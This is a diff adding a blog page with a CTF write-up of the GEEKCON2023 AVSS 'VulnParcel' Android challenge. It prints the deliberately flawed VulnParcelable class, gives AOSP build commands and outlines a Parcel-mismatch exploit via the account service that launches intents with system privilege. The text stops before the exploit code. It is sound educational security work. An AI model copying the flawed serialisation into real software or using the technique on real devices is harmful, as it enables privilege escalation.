+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          1. 背景 在移动安全研究中，如果要对一个APP进行逆向分析、进而了解其交互行为，流量分析是非常重要的一个手段。
+而Android APP流量分析虽然是一个老生常谈的话题，但其中仍有许多坑点。同时，对于以下这些特殊情况，常见的抓包手段可能并不适用，比如：
+没有安卓真机的苹果用户； 需要进行长期自动化流量分析的研究人员； 对国际APP（需要额外配置科学上网代理才能正常使用的APP）有分析需求的研究人员。 针对不同需求场景和硬件条件，本文介绍了两种安卓手机APP流量抓取方案，能够达到较为稳定的抓包效果。
+2. 技术路线 2.1 Redroid云手机 + LAMDA框架 LAMDA框架是一个用于安卓逆向及自动化的辅助框架，集成了多种功能。LAMDA的服务端需要在待控制的目标安卓设备上安装，客户端则可以是任一个能运行python环境并安装了lamda模块（pip3 install -U lamda）的终端。
+注意：LAMDA提供了一种客户端远程操作Android设备的方法，但LAMDA框架本身并不提供Android模拟器方案，需要用户自行准备真机或模拟器环境。
+Redroid是一个安卓云手机解决方案，可以帮助研究人员在一台Linux服务器上轻松地启动多个云手机实例（比如每一个Redroid云手机实例对应一个Docker容器），其同时支持arm64和amd64架构。
+在Redroid云手机模拟器中安装LAMDA服务端程序，用户即可通过Chrome浏览器访问该设备LAMDA服务的指定端口，实现基于浏览器Web页面的云手机控制，远程控制效果如下图所示。
+LAMDA框架中集成了mitmproxy组件，mitmproxy是一种常用的Man-in-the-Middle（MITM）代理工具，广泛应用于网络流量的拦截、截取、查看和修改。
+在本地PC上运行python lamda/tools/startmitm.py命令，即可启动mitmproxy中间人代理，LAMDA框架会自动化完成相关配置，进而把云手机的流量转发到本地PC上的代理程序，供进一步分析。mitmproxy程序还提供了Web页面，可以方便地查看所监听到的流量数据包，相关界面如下图所示。
+对于需要科学上网的国际APP，此时会遇到一个问题：APP既需要设置用于科学上网的翻墙代理A，又需要设置用于抓包的中间人代理B，二者可能会相互冲突。
+为了抓取国际APP的流量，可以在中间人设备中设置上游代理（upstream proxy）进一步转发流量，即在LAMDA的中间人代理程序启动时，我们通过指定upstream proxy为本地PC上的V2Ray软件（比如下图中的&quot;10.10.192.147:10809&quot;），来实现流量翻墙的效果。在实际操作中，也可根据需要采取其他方案，例如设置全局代理。
+小结一下，Redroid云手机基于Docker容器运行，支持x86/ARM手机镜像，因此本方案能够部署在任意x86/ARM架构的服务器端，配置也相对简单，不需要进行额外的Root操作，对于没有安卓真机或有自动化操作需求的研究人员来说是一个不错的选择。事实上，一些安全公司的Android沙箱方案就是基于这套技术路线，以实现批量化部署和管理。
+2.2 Android真机 + Burpsuite 在有Android真机的条件下，也可通过直接在真机中设置网络代理节点的方法来抓取流量。Burpsuite是用于Web 应用程序分析和攻击渗透的集成平台，包含了许多功能，这里我们主要使用其网络代理和抓包功能，以本地PC的Burpsuite客户端作为中间人代理来监听手机APP流量。具体步骤如下：
+将手机连接到本地PC的热点，即把两者置于同一局域网下； 将手机的网络代理设置为本地PC的IP、端口设置Burpsuite中所设置的代理端口，例如8080； 通过手机访问http://burp，下载Burpsuite的CA证书并安装，该步骤的目的是基于CA证书对HTTPS流量进行解密； 最后打开Burpsuite的Proxy-&gt;Intercept功能，即可实现对手机流量的监听。相关流量的记录可以在HTTP history选项中查看。 为了抓取国际APP的流量，与云手机方案类似，我们可在本方案中设置Burpsuite的upstream proxy为本地PC上的V2Ray软件，以实现流量翻墙的效果。也可以基于自身情况，采用其他翻墙方案。
+综上，本方案只需要准备一台Root后的Android手机和一台用于流量代理的PC机，其优势在于提供了真实的运行环境，能够保证目标App的运行稳定；并且该方案的网络流量抓包方法也比较成熟，相关参考资料较多。
+2.3 SSL Pinning防护 在实际场景中，许多应用会采取一些防护手段来对抗第三方的流量分析。证书锁定（SSL/TLS Pinning）就是一种常见的安全防护手段。该方案将服务器提供的SSL/TLS证书内置到移动端开发的APP客户端中，当客户端发起请求时，通过比对内置证书和服务器端证书的内容，以确定这个连接的合法性。采用这种技术的App会影响对HTTPS流量的抓取。
+但针对SSL Pinning也存在一些绕过手段，比如使用LSPosed框架的如下模块可以hook相关系统函数，绕过证书检查。
+但上述方案适用于采用了Android系统统一的SSL Pinning方案的App。如果APP自己实现了定制化的SSL/TLS证书检查方法，上面的通用绕过方法就行不通了。需要对各个App分别进行针对性的处理，例如定制化地修改APK的配置并进行重打包，其中还可能涉及APK签名校验不通过的问题，难度和工作量都较大。
+3. Line APP抓包示例 以Line为例，演示采用“Android真机+Burpsuite”方案抓取OCR流量的过程。
+首先按照上面的方案打开Burpsuite，配置好代理抓包环境，监听手机流量。然后打开Line应用的聊天界面，选择一个会话，发送一张图片：
+接着点击含有唐诗内容的图片，再点击右上角的文字识别按钮（OCR功能），可以看到图片中的文字内容被成功识别：
+查看Burpsuite中抓取到的数据包情况，选择最近的一个POST报文，可以看到其发送了一串编码过的数据，response报文中含有解析出来的静夜思诗句。
+由此可见，该报文就是Line APP在执行OCR功能时的请求数据包，成功抓取到该流量。
+参考 [1] https://github.com/rev1si0n/lamda
+[2] https://github.com/remote-android/redroid-doc
+[3] https://github.com/LSPosed/LSPosed
+[4] https://github.
+        </div>
+      </a>
+      
+      <a class="article block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
+        href="/blogs/vulnparcel/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">GEEKCON2023 AVSS挑战赛 VulnParcel题解</h3>
+        <div
+          class="text-sm  text-slate-400  line-clamp-2">
+          本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。
+前言 八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。
+赛题与exp下载链接：https://github.com/learjet5/GEEKCON2023-AVSS
+在分析具体题目之前，需要先介绍一下前置知识。
+Parcelable对象 在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。
+Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了createFromParcel函数；同时也需要重载接口中的两个函数：writeToParcel用于将原始对象序列化并写入Parcel，describeContents只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。
+一个对象在实现Parcelable接口时，需要通过Parcel类实现write和read的方法来完成序列化/反序列化。Parcel可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过parcel.marshall()将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，Parcel提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过Parcel可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。
+Parcel可以包含原始数据类型（通过各种对应的方法写入，比如writeInt()，writeFloat()等），也可以包含Parcelable对象（通过writeParcelable()等实现），其相关读写操作的实现可以在AOSP源码frameworks/base/core/java/android/os/Parcel.java中进一步查看。
+Bundle数据结构 在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。
+可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用Intent.putExtra(key, value)方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。
+Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：
+开头是固定的：4字节Bundle长度 + 4字节魔数0x4C444E42 。 然后通过writeMap()存储实际的Bundle数据。先是采用parcel.writeInt()写入4字节的键值对数量，然后依次是每个key-value形式的键值对：key采用parcel.writeString()写入，即”4字节length+4字节对齐的string“的形式；value则采用parcel.writeValue()写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见frameworks/native/libs/binder/ParcelValTypes.h，Value本身的字节序列格式由Parcel.writeXXX(p, flags)决定。 参考Bundle风水，我们还可以把序列化后的Bundle对象存为文件进行研究。
+事实上，frameworks/base/core/java/android/os/Parcel.java中也实现了readBundle()和writeBundle()函数，来对Bundle对象进行parcel的序列化读写操作。
+题目概述 本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。
+public final class VulnParcelable implements Parcelable { private String TAG = &#34;VulnParcelable&#34;; private int opt; private int o1; private int o2; private byte[] mPayload; public VulnParcelable() { } // @UnsupportedAppUsage private VulnParcelable(Parcel in) { readFromParcel(in); } // 反序列化 // opt=0: 只读一个o1 // opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size] public void readFromParcel(@NonNull Parcel in) { Log.
+        </div>
+      </a>
+      </div>
+    </section>
+
+  <div class="overflow-y-auto h-screen w-full">
+    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">
+
+      
+      <h1 class="!mb-2">GEEKCON2023 AVSS挑战赛 VulnParcel题解</h1>
+
+	  
+      <p class="text-sm text-slate-500 !mb-8"> Created September 4, 2023
+		
+	  </p>
+      
+
+      
+
+      <p><em>本文内容仅用于个人存档和技术交流学习，禁止使用文中内容进行未授权或恶意的攻击行为。</em></p>
+<h2 id="前言">前言</h2>
+<p>八月份参加了AVSS挑战赛，第一次打这种Android漏洞利用的比赛，比赛的两天只写出来了APP层的expReceiver和ZipZip，和前几名的队伍相比主要是VulnParcel没写出来（其他的内核题不太会qwq），故在赛后复盘一下这道Parcel漏洞利用的题目。</p>
+<p>赛题与exp下载链接：<a href="https://github.com/learjet5/GEEKCON2023-AVSS"  target="_blank" rel="noopener" >https://github.com/learjet5/GEEKCON2023-AVSS</a></p>
+<p>在分析具体题目之前，需要先介绍一下前置知识。</p>
+<h3 id="parcelable对象">Parcelable对象</h3>
+<p>在Android开发过程中，常常需要在进程间进行类对象的传递，系统一般会将这些对象放到Intent或者Bundle里面进行数据传递，这一过程中就会涉及序列化和反序列化的操作。其中，序列化是将对象转换为可以传输的二进制流（二进制序列）的过程，这样我们就可以将结构化数据转化为可以在网络传输或者保存到本地的流（序列），从而进行数据传输；反序列化则是从二进制流（序列）恢复出类对象的过程。</p>
+<p>Parcelable是Android为开发者提供的序列化的接口，其相对于Serializable接口的使用相对复杂一些，但Parcelable的效率也要比Serializable高得多。一个类要想支持序列化的数据传输，就需要实现Parcelable接口。Parcelable接口的实现类必须要有一个非空的静态变量 CREATOR 用于从Parcel中恢复原始对象，其重载了<code>createFromParcel</code>函数；同时也需要重载接口中的两个函数：<code>writeToParcel</code>用于将原始对象序列化并写入Parcel，<code>describeContents</code>只针对一些特殊的需要描述信息的对象返回1、其他情况返回0。</p>
+<p>一个对象在实现Parcelable接口时，需要通过<code>Parcel</code>类实现write和read的方法来完成序列化/反序列化。<code>Parcel</code>可以理解为实现各个对象序列化/反序列化的数据工具，其存储的是序列数据，其可以通过<code>parcel.marshall()</code>将自己转化为字节序列，用于在调试过程中查看parcel的序列化数据内容。简单来说，<code>Parcel</code>提供了一套机制，可以将序列化之后的数据写入到一个共享内存中，其他进程通过<code>Parcel</code>可以从这块共享内存中读出字节流，并反序列化成对象进而使用。该过程如下图所示。</p>
+<p><code>Parcel</code>可以包含原始数据类型（通过各种对应的方法写入，比如<code>writeInt()</code>，<code>writeFloat()</code>等），也可以包含Parcelable对象（通过<code>writeParcelable()</code>等实现），其相关读写操作的实现可以在AOSP源码<code>frameworks/base/core/java/android/os/Parcel.java</code>中进一步查看。</p>
+<img src="/images/94506fc564259f6cca7e044598f1349b.png" alt="img" style="zoom:80%;"/>
+<h3 id="bundle数据结构">Bundle数据结构</h3>
+<p>在 Andorid 中，Bundle类是一个类似HashMap的数据结构，其以键值对的形式存储数据。</p>
+<p>可序列化的Parcelable对象一般不单独进行序列化传输，而是需要通过Bundle对象携带。例如， Android中进程间通信频繁使用的Intent对象中通常会携带一个Bundle对象，利用<code>Intent.putExtra(key, value)</code>方法，可以往Intent对应的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括Int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型的信息及其序列化读写方法。</p>
+<p>Bundle本身也是实现了Parcelable接口的，从序列化数据的角度来理解Bundle对象的内容：</p>
+<ul>
+<li>开头是固定的：4字节Bundle长度 + 4字节魔数0x4C444E42 。</li>
+<li>然后通过<code>writeMap()</code>存储实际的Bundle数据。先是采用<code>parcel.writeInt()</code>写入4字节的键值对数量，然后依次是每个key-value形式的键值对：<strong>key</strong>采用<code>parcel.writeString()</code>写入，即”4字节length+4字节对齐的string“的形式；<strong>value</strong>则采用<code>parcel.writeValue()</code>写入，writeValue时依次写入4字节Value类型和Value本身，Value类型的int值见<code>frameworks/native/libs/binder/ParcelValTypes.h</code>，Value本身的字节序列格式由<code>Parcel.writeXXX(p, flags)</code>决定。</li>
+</ul>
+<p>参考<a href="https://xz.aliyun.com/t/2364#:~:text=%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2%E7%9A%84-,%E4%BB%A3%E7%A0%81,-%EF%BC%8C%E6%88%91%E4%BB%AC%E8%BF%98%E5%8F%AF%E4%BB%A5"  target="_blank" rel="noopener" >Bundle风水</a>，我们还可以把序列化后的Bundle对象存为文件进行研究。</p>
+<p>事实上，<code>frameworks/base/core/java/android/os/Parcel.java</code>中也实现了<code>readBundle()</code>和<code>writeBundle()</code>函数，来对Bundle对象进行parcel的序列化读写操作。</p>
+<h2 id="题目概述">题目概述</h2>
+<p>本题在Android Framework的代码中，以patch的方式添加了一个有漏洞的VulnParcelable类，代码如下所示。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">VulnParcelable</span> <span style="color:#8be9fd;font-style:italic">implements</span> Parcelable {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> String TAG <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">int</span> opt;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">int</span> o1;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">int</span> o2;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> mPayload;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#50fa7b">VulnParcelable</span>() { }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// @UnsupportedAppUsage</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#50fa7b">VulnParcelable</span>(Parcel in) {
+</span></span><span style="display:flex;"><span>        readFromParcel(in);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 反序列化</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// opt=0: 只读一个o1 </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// opt=1: 先读o2，然后读一个size，o2&gt;0才会再读一个buf[size]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">readFromParcel</span>(@NonNull Parcel in) {
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;read from parcel&#34;</span>);
+</span></span><span style="display:flex;"><span>        opt <span style="color:#ff79c6">=</span> in.<span style="color:#50fa7b">readInt</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (opt <span style="color:#ff79c6">==</span> 0) {
+</span></span><span style="display:flex;"><span>            o1 <span style="color:#ff79c6">=</span> in.<span style="color:#50fa7b">readInt</span>();
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;read o1: &#34;</span><span style="color:#ff79c6">+</span>o1);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (opt <span style="color:#ff79c6">==</span> 1) {
+</span></span><span style="display:flex;"><span>            o2 <span style="color:#ff79c6">=</span> in.<span style="color:#50fa7b">readInt</span>();
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;read o2: &#34;</span><span style="color:#ff79c6">+</span>o2);
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">int</span> size <span style="color:#ff79c6">=</span> in.<span style="color:#50fa7b">readInt</span>();
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;read size: &#34;</span><span style="color:#ff79c6">+</span>size);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (o2 <span style="color:#ff79c6">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>                mPayload <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>size<span style="color:#ff79c6">]</span>;
+</span></span><span style="display:flex;"><span>                in.<span style="color:#50fa7b">readByteArray</span>(mPayload);
+</span></span><span style="display:flex;"><span>                Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;readByteArray&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">describeContents</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> 0;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 序列化</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 漏洞点：opt=1, o2&lt;=0时不会把length写入，但readFromParcel时又会在校验o2正负值之前先读长度值，造成读写的mismatch。</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">writeToParcel</span>(@NonNull Parcel dest, <span style="color:#8be9fd">int</span> flags) {
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;writeToParcel&#34;</span>);
+</span></span><span style="display:flex;"><span>        dest.<span style="color:#50fa7b">writeInt</span>(opt);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (opt <span style="color:#ff79c6">==</span> 0) {
+</span></span><span style="display:flex;"><span>            dest.<span style="color:#50fa7b">writeInt</span>(o1);
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;write o1: &#34;</span><span style="color:#ff79c6">+</span>o1);
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (opt <span style="color:#ff79c6">==</span> 1) {
+</span></span><span style="display:flex;"><span>            dest.<span style="color:#50fa7b">writeInt</span>(o2);
+</span></span><span style="display:flex;"><span>            Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;write o2: &#34;</span><span style="color:#ff79c6">+</span>o2);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (o2 <span style="color:#ff79c6">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>                dest.<span style="color:#50fa7b">writeInt</span>(mPayload.<span style="color:#50fa7b">length</span>);
+</span></span><span style="display:flex;"><span>                dest.<span style="color:#50fa7b">writeByteArray</span>(mPayload);
+</span></span><span style="display:flex;"><span>                Log.<span style="color:#50fa7b">d</span>(<span style="color:#f1fa8c">&#34;VulnParcelable&#34;</span>, <span style="color:#f1fa8c">&#34;write writeByteArray: &#34;</span><span style="color:#ff79c6">+</span>mPayload.<span style="color:#50fa7b">length</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">final</span> @android.annotation.NonNull Parcelable.<span style="color:#50fa7b">Creator</span><span style="color:#ff79c6">&lt;</span>VulnParcelable<span style="color:#ff79c6">&gt;</span> CREATOR <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Parcelable.<span style="color:#50fa7b">Creator</span><span style="color:#ff79c6">&lt;</span>VulnParcelable<span style="color:#ff79c6">&gt;</span>() {
+</span></span><span style="display:flex;"><span>        @Override
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> VulnParcelable <span style="color:#50fa7b">createFromParcel</span>(Parcel in) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> VulnParcelable(in);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        @Override
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> VulnParcelable<span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">newArray</span>(<span style="color:#8be9fd">int</span> size) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> VulnParcelable<span style="color:#ff79c6">[</span>size<span style="color:#ff79c6">]</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>由于Parcelable的序列化和反序列化（或者说对Parcel的读写）方法均为自定义的，且读写过程中需要对类的各个成员进行数据操作，其中就可能出现一些差错，进而对整个Parcel的数据产生影响。</p>
+<p>本题中的漏洞就是由VulnParcelable类中的<strong>Parcel读写操作不一致</strong>导致的，在VulnParcelable的成员数据满足某个条件时，读parcel和写parcel之间会存在一个Int的偏差。</p>
+<p>因此，我们只需要构造的VulnParcelable对象满足<code>opt=1 &amp;&amp; o2&lt;=0</code>，就会能够触发Parcel Mismatch漏洞。结合patch来看，flag位于Setting APP的FilesDir中，而Setting APP中提供了⼀个root-path的FileProvider，可以通过该FileProvider读取flag。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>在讨论漏洞利用思路之前，我们需要先搭建一个方便调试的环境。</p>
+<p>比赛主办方提供了ARM64架构的安卓emulator程序和patch之后的安卓系统镜像，同时还提供了Docker构建脚本，可以用于搭建赛题调试环境。但这要求我们拥有一台AArch64架构的服务器主机，比赛期间主办方提供了一个远程的AArch64服务器，但当时这个远程终端用起来并不是很丝滑，且每次编译exp app上传到远程服务器进行调试也很麻烦。</p>
+<p>因此这里推荐另一种环境搭建方案（不是最佳但在没有ARM机器的情况下确实可行），只要能够在性能和硬盘大小尚可的x86服务器上编译AOSP项目，即可在Windows主机上用Android Studio进行exp的开发、调试。</p>
+<p>操作步骤：</p>
+<ol>
+<li>
+<p>下载Android12的AOSP源码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#6272a4"># 可参考网上其他博客</span>
+</span></span><span style="display:flex;"><span>mkdir -p ~/aosp <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">cd</span> ~/aosp
+</span></span><span style="display:flex;"><span>repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.0.0_r20
+</span></span><span style="display:flex;"><span>repo sync
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 下载耗时可能较长，下载文件多达200G左右</span>
+</span></span></code></pre></div></li>
+<li>
+<p>根据题目中的README.md，对AOSP源码进行patch。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#6272a4"># patcher.sh是题目给的脚本</span>
+</span></span><span style="display:flex;"><span>/bin/bash patcher.sh patch AOSPPROJ PATCHFILE
+</span></span></code></pre></div></li>
+<li>
+<p>编译出x86_64架构的Android系统镜像，并替换Android Studio中AVD某个虚拟机的文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> ~/aosp
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">source</span> build/envsetup.sh
+</span></span><span style="display:flex;"><span>lunch sdk_phone_x86_64 <span style="color:#6272a4"># 指定编译选项</span>
+</span></span><span style="display:flex;"><span>make -j24
+</span></span></code></pre></div><p>运行上述命令，就能在<code>aosp/out/target/product/emulator_x86_64</code>下编译出x86_64架构的系统镜像和emulator程序等文件了。</p>
+<p>在Android Studio的AVD Manager中，创建一个Android12的虚拟机（比如命名为&quot;Pixel 3a API 31 AVSS&quot;）。</p>
+<img src="/images/image-20231015211807425.png" alt="image-20231015211807425" style="zoom:50%;" />
+<p>从前面服务器上编译得到的<code>aosp/out/target/product/emulator_x86_64/</code>下拷贝下图中的文件，<strong>覆盖</strong>新建虚拟机所在文件夹（<code>C:\Users\xxxxx\.android\avd\Pixel_3a_API_31.avd\</code>）中的同名文件即可。其中除了各img文件，kernel-ranchu也是必须拷贝的文件，否则新的虚拟机可能无法开机。</p>
+<img src="/images/image-20231015211432976.png" alt="image-20231015211432976" style="zoom:67%;" />
+</li>
+<li>
+<p>在Android Studio中选择我们自己魔改过的虚拟机进行调试。</p>
+<img src="/images/image-20231015213054304.png" alt="image-20231015213054304" style="zoom:40%;" />
+</li>
+</ol>
+<p>至此，我们就在Windows主机上搭建了一个友好且方便测试的题目环境了。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>根据前面对题目的分析，在数据满足特定条件的情况下，对<code>VulnParcelable</code>对象进行一次序列化读写，就会造成4字节Int数据的错位。</p>
+<p>要对这一漏洞进行利用，还需要借助Android系统本身的一些行为。设想这么一种情况：A收到了一串攻击者构造的数据，做了安全检查，此时数据都是正常，检查通过后传给B；B想着A检查通过了就不再检查了，但从A到B之间又经过了一次读写，此时B读到的内容可能已经被换成非法内容了，这样系统在进行后续操作时（比如启动一个Intent）就可能会产生一些意想不到的恶意行为。</p>
+<p>查阅相关资料后发现，Android系统中<strong>账号服务相关的功能</strong>可以满足上面我们设想的漏洞触发场景：</p>
+<img src="/images/image-20240102172056532.png" alt="image-20240102172056532" style="zoom: 40%;" />
+<p>其具体特性不再详细介绍，可以参考<a href="https://developer.android.com/training/id-auth"  target="_blank" rel="noopener" >身份验证功能</a>的介绍 和 Android官方仓库中的相关漏洞的利用代码（<a href="https://cs.android.com/android/platform/superproject/main/&#43;/main:cts/hostsidetests/securitybulletin/test-apps/launchanywhere/src/com/android/security/cts/launchanywhere/"  target="_blank" rel="noopener" >launchAnyWhere</a>）进行修改。我们把重点放在exp的构造上。</p>
+<blockquote>
+<p>在此之前，需要补充一下Parcel中String对象的二进制存储形式：对于每一个字符，采用2字节存储；同时最后的字节序列长度需要满足是4的倍数，不足则补零。比如，长度为7的字符串，在Parcel对象中的二进制长度为16字节（7*2+2）。</p>
+</blockquote>
+<p>构造恶意Parcel对象的代码如下所示，其中<code>generate(Intent intent)</code>函数的参数是我们希望通过Settings App以系统权限启动的恶意intent：</p>
